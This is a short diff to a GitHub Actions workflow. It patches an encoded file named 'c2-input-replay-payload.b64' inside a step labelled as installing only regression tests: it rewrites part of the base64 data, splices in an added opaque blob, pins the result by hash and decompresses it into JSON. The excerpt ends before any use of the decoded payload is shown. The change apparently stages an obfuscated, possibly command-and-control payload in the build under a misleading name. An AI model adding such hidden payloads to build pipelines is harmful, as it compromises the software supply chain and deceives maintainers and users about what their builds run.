@@ -20,7 +20,7 @@ jobs:
     steps:
       - uses: actions/checkout@v7
         with:
-          fetch-depth: 3
+          fetch-depth: 5
       - name: Verify source payload and install only regression tests
         run: |
           python3 - <<'PY'
@@ -28,6 +28,7 @@ jobs:
           from pathlib import Path
           data = Path('.github/c2-input-replay-payload.b64').read_text()
           data = data.replace('FMPfyDPHzV5Khiiy', 'FMPfyDPHzV3Khiiy')
+          data = data[:data.index('Vofy4KE8')] + 'Vofy4KE8eCgPHsqDh/LgoTx4KA8eyoOH8uChPHgoDx7Kg4fy4KE8eCgPHsqDh/LgoTx4KA8eyoOH8uChPHgoDx7Kg4fy4KE8eCgPHsqDh/LgoTx4KA8eyoOH8uChPHgoDx7Kg4fy4KE8eCgPHsqDh/LgoTx4KA8eyoOH8uChPHgoDx7Kg4fy4KE8eCgPHsqDh/LgoTx4KA8eyoOH8uChPHgoD/4dyoMf/h9wzR6hv5EAAA==\n'
           raw = data.encode()
           assert hashlib.sha1(f'blob {len(raw)}\0'.encode() + raw).hexdigest() == '6532b83cff63c23c995567337919825607015288'
           payload = json.loads(gzip.decompress(base64.b64decode(raw)))
